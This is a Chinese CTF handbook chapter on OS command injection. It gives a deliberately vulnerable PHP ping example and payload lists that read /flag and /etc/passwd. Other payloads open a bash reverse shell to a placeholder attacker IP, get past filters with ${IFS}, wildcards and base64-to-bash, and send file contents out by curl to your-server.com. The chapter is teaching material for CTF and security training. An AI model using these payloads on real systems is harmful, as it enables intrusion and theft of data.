---
title: 命令注入
order: 5
icon: mdi:console
category:
  - CTF
  - 手册
  - Web
---

命令注入是指攻击者通过用户输入，将操作系统命令拼接进服务器执行的命令中，从而在服务器上执行任意命令。

## 漏洞原理

```php
// 漏洞代码示例
$ip = $_GET['ip'];
system("ping -c 1 " . $ip);
```

正常输入：`127.0.0.1` → 执行 `ping -c 1 127.0.0.1`

攻击输入：`127.0.0.1; cat /flag` → 执行 `ping -c 1 127.0.0.1; cat /flag`

## 常用拼接符

| 符号 | 含义 | 示例 |
|------|------|------|
| `;` | 顺序执行 | `cmd1; cmd2` |
| `&&` | 前成功才执行后 | `cmd1 && cmd2` |
| `\|\|` | 前失败才执行后 | `cmd1 \|\| cmd2` |
| `\|` | 管道，前的输出给后 | `cmd1 \| cmd2` |
| `` ` ` `` | 命令替换 | `` `cmd` `` |
| `$()` | 命令替换 | `$(cmd)` |
| `\n` | 换行执行 | `cmd1%0acmd2` |

## 基础 Payload

```bash
# 读取 flag
; cat /flag
; cat /flag.txt
; cat /etc/passwd

# 查看目录
; ls /
; ls /var/www/html

# 反弹 shell（拿到交互式 shell）
; bash -i >& /dev/tcp/攻击者IP/4444 0>&1
```

## 绕过过滤

### 空格过滤

```bash
cat${IFS}/flag          # ${IFS} 是内部字段分隔符（空格）
cat$IFS/flag
cat</flag               # 重定向代替空格
{cat,/flag}             # 大括号展开
```

### 关键词过滤

```bash
# 过滤了 cat
more /flag
less /flag
tac /flag               # 反向输出
head /flag
tail /flag
strings /flag

# 过滤了 flag
cat /fla*               # 通配符
cat /fla?               # 单字符通配符
cat /f???               # 多个通配符
```

### 斜杠过滤

```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd   # 用变量切片得到 /
```

### 编码绕过

```bash
# Base64 解码执行
echo "Y2F0IC9mbGFn" | base64 -d | bash
# Y2F0IC9mbGFn 是 "cat /flag" 的 base64

# 十六进制
$(printf "\x63\x61\x74\x20\x2f\x66\x6c\x61\x67")
```

## 无回显命令注入

服务器执行了命令但不显示结果时：

```bash
# 时间盲注：用 sleep 判断命令是否执行
; sleep 5

# DNS 外带：把结果发到你控制的域名
; curl http://your-server.com/$(cat /flag | base64)

# 写文件到 web 目录
; echo "result" > /var/www/html/result.txt
# 然后访问 http://target/result.txt
```

## 防御原理（了解）

- 使用参数化命令（如 `escapeshellarg()`）
- 白名单验证输入
- 避免直接拼接用户输入到系统命令

::: note 课后练习
课后练习需要你连接校园网才能访问内网练习平台。
:::

## 课后练习

- [ping 一下试试](http://172.16.173.140/training/11?challenge=42) — 一个在线 ping 工具，尝试拼接命令读取服务器上的 flag

## 练手资源

- CTFHub 命令注入技能树
- DVWA（Command Injection 模块）
